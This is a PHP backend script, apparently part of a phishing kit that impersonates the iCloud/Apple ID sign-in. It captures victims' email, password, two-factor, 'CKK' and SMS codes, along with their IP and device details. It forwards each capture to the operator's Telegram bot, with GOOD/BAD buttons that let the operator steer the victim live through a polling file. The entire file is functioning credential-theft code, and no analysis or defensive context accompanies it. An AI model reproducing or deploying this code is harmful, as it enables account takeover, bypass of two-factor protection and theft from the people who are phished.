<?php
session_start();
include __DIR__ . '/settings.php';
include __DIR__ . '/lang_main.php';

header('Content-Type: application/json');

function getIP() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
    }
    return 'N/A';
}

function parseDevice($ua) {
    if (preg_match('/iPhone/', $ua))      $device = '📱 iPhone';
    elseif (preg_match('/iPad/', $ua))    $device = '📲 iPad';
    elseif (preg_match('/Android/', $ua)) $device = '🤖 Android';
    else                                   $device = '🖥️ Desktop';

    if (preg_match('/iPhone OS ([\d_]+)/', $ua, $m))     $os = 'iOS ' . str_replace('_','.',$m[1]);
    elseif (preg_match('/Android ([0-9.]+)/', $ua, $m))  $os = 'Android ' . $m[1];
    elseif (preg_match('/Mac OS X/', $ua))                $os = 'macOS';
    elseif (preg_match('/Windows NT 10/', $ua))           $os = 'Windows 10/11';
    elseif (preg_match('/Windows NT/', $ua))              $os = 'Windows';
    else                                                   $os = 'Inconnu';

    if (preg_match('/CriOS/', $ua))            $br = 'Chrome iOS';
    elseif (preg_match('/FxiOS/', $ua))        $br = 'Firefox iOS';
    elseif (preg_match('/EdgA?\//', $ua))      $br = 'Edge';
    elseif (preg_match('/OPR\//', $ua))        $br = 'Opera';
    elseif (preg_match('/SamsungBrowser/', $ua)) $br = 'Samsung';
    elseif (preg_match('/Chrome\//', $ua))     $br = 'Chrome';
    elseif (preg_match('/Safari\//', $ua))     $br = 'Safari';
    elseif (preg_match('/Firefox\//', $ua))    $br = 'Firefox';
    else                                        $br = 'Inconnu';

    return $device . ' · ' . $os . ' · ' . $br;
}

$step  = $_POST['step']  ?? '';
$email = trim($_POST['email'] ?? '');
$pass  = trim($_POST['pass']  ?? '');
$ip    = getIP();
$ua    = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$dev   = parseDevice($ua);
$dt    = date('d/m/Y à H:i') . ' UTC';

// ── STEP 1 ──────────────────────────
if ($step === '1' && $email !== '') {
    $_SESSION['icloud_email'] = $email;

    $message = <<<TEXT
🍎 <b>iCLOUD – Nouvel accès</b> [<code>STEP 1</code>]

<b>Identité</b>
└ 📧 Email: <code>$email</code>

<b>Appareil</b>
└ 📱 $dev

<b>Réseau</b>
├ 🌐 IP: <code>$ip</code>
└ 🕐 $dt

⏳ <i>En attente du mot de passe…</i>
TEXT;

    sendTelegramMessage($bot_token, $chat_id, $message);
    echo json_encode(['ok' => true]);
    exit;
}

// ── STEP 2 ──────────────────────────
if ($step === '2' && $pass !== '') {
    $email = ($email !== '') ? $email : ($_SESSION['icloud_email'] ?? '—');

    $message = <<<TEXT
🍎 <b>iCLOUD – Combo capturé ✅</b> [<code>STEP 2</code>]

<b>Apple ID</b>
├ 📧 Email: <code>$email</code>
└ 🔑 Password: <code>$pass</code>

<b>Appareil</b>
└ 📱 $dev

<b>Réseau</b>
├ 🌐 IP: <code>$ip</code>
└ 🕐 $dt
TEXT;

    // Reset ip_list so a previous badcc/goodcc doesn't fire immediately on re-poll
    $ipListFile = __DIR__ . '/security_check/ip_list.txt';
    file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX);

    $proto   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host    = $_SERVER['HTTP_HOST'];
    $dir     = dirname($_SERVER['PHP_SELF']);
    if ($dir === '/' || $dir === '\\') $dir = '';
    $vbvUrl  = $proto . '://' . $host . $dir . '/security_check/actionsvbv.php';
    $encIp   = urlencode($ip);

    $keyboard = [
        'inline_keyboard' => [[
            ['text' => '✅ GOOD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=goodcc'],
            ['text' => '❌ BAD',  'url' => $vbvUrl . '?ip=' . $encIp . '&otp=badcc'],
        ]]
    ];

    sendTelegramMessage($bot_token, $chat_id, $message, $keyboard);
    echo json_encode(['ok' => true]);
    exit;
}

// ── STEP 3 : 2FA code ───────────────
if ($step === '3' && !empty($_POST['code'])) {
    $code  = preg_replace('/[^0-9]/', '', trim($_POST['code']));
    $email = $_SESSION['icloud_email'] ?? '—';

    // Reset ip_list so a previous appbad doesn't fire immediately on re-poll
    $ipListFile3 = __DIR__ . '/security_check/ip_list.txt';
    file_put_contents($ipListFile3, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX);

    $message2 = <<<TEXT
🍎 <b>iCLOUD – Code 2FA saisi</b> [<code>STEP 3</code>]

<b>Apple ID</b>
├ 📧 Email: <code>$email</code>
└ 🔢 Code: <code>$code</code>

<b>Appareil</b>
└ 📱 $dev

<b>Réseau</b>
├ 🌐 IP: <code>$ip</code>
└ 🕐 $dt
TEXT;

    $proto2  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host2   = $_SERVER['HTTP_HOST'];
    $dir2    = dirname($_SERVER['PHP_SELF']);
    if ($dir2 === '/' || $dir2 === '\\') $dir2 = '';
    $vbvUrl2 = $proto2 . '://' . $host2 . $dir2 . '/security_check/actionsvbv.php';
    $encIp2  = urlencode($ip);

    $keyboard2 = [
        'inline_keyboard' => [[
            ['text' => '✅ APPVALID', 'url' => $vbvUrl2 . '?ip=' . $encIp2 . '&otp=appvalid'],
            ['text' => '❌ APPBAD',   'url' => $vbvUrl2 . '?ip=' . $encIp2 . '&otp=appbad'],
        ]]
    ];

    sendTelegramMessage($bot_token, $chat_id, $message2, $keyboard2);
    echo json_encode(['ok' => true]);
    exit;
}

// ── CKK STEP ────────────────────────
if ($step === 'ckk' && !empty($_POST['ckk'])) {
    $ckk   = preg_replace('/[^0-9]/', '', trim($_POST['ckk']));
    $email = $_SESSION['icloud_email'] ?? '—';

    $messageCkk = <<<TEXT
🔐 <b>iCLOUD – CKK saisi</b> [<code>CKK STEP</code>]

<b>Apple ID</b>
└ 📧 Email: <code>$email</code>

<b>Code CKK</b>
└ 🔢 Code: <code>$ckk</code>

<b>Réseau</b>
├ 🌐 IP: <code>$ip</code>
└ 🕐 $dt
TEXT;

    $proto   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host    = $_SERVER['HTTP_HOST'];
    $dir     = dirname($_SERVER['PHP_SELF']);
    if ($dir === '/' || $dir === '\\') $dir = '';
    $vbvUrl  = $proto . '://' . $host . $dir . '/security_check/actionsvbv.php';
    $encIp   = urlencode($ip);

    $keyboardCkk = [
        'inline_keyboard' => [[
            ['text' => '✅ CKKOK', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkok'],
            ['text' => '❌ CKKBAD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkbad'],
        ]]
    ];

    // Reset ip_list for polling
    $ipListFile = __DIR__ . '/security_check/ip_list.txt';
    file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting_ckk', FILE_APPEND | LOCK_EX);

    sendTelegramMessage($bot_token, $chat_id, $messageCkk, $keyboardCkk);
    echo json_encode(['ok' => true]);
    exit;
}

// ── STEP 4 : SMS code ───────────────
if ($step === '4' && !empty($_POST['code'])) {
    $code  = preg_replace('/[^0-9]/', '', trim($_POST['code']));
    $email = $_SESSION['icloud_email'] ?? '—';

    $message4 = <<<TEXT
📩 <b>iCLOUD – Code SMS saisi</b> [<code>STEP 4</code>]

<b>Apple ID</b>
├ 📧 Email: <code>$email</code>
└ 🔢 Code SMS: <code>$code</code>

<b>Réseau</b>
├ 🌐 IP: <code>$ip</code>
└ 🕐 $dt
TEXT;

    // Reset ip_list pour ce nouvel envoi
    $ipListFile4 = __DIR__ . '/security_check/ip_list.txt';
    file_put_contents($ipListFile4, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX);

    $proto4  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host4   = $_SERVER['HTTP_HOST'];
    $dir4    = dirname($_SERVER['PHP_SELF']);
    if ($dir4 === '/' || $dir4 === '\\') $dir4 = '';
    $vbvUrl4 = $proto4 . '://' . $host4 . $dir4 . '/security_check/actionsvbv.php';
    $encIp4  = urlencode($ip);

    $keyboard4 = [
        'inline_keyboard' => [[
            ['text' => '✅ SMSVALID', 'url' => $vbvUrl4 . '?ip=' . $encIp4 . '&otp=smsvalid'],
            ['text' => '❌ SMSBAD',   'url' => $vbvUrl4 . '?ip=' . $encIp4 . '&otp=smsbad'],
        ]]
    ];

    sendTelegramMessage($bot_token, $chat_id, $message4, $keyboard4);
    echo json_encode(['ok' => true]);
    exit;
}

echo json_encode(['ok' => false]);
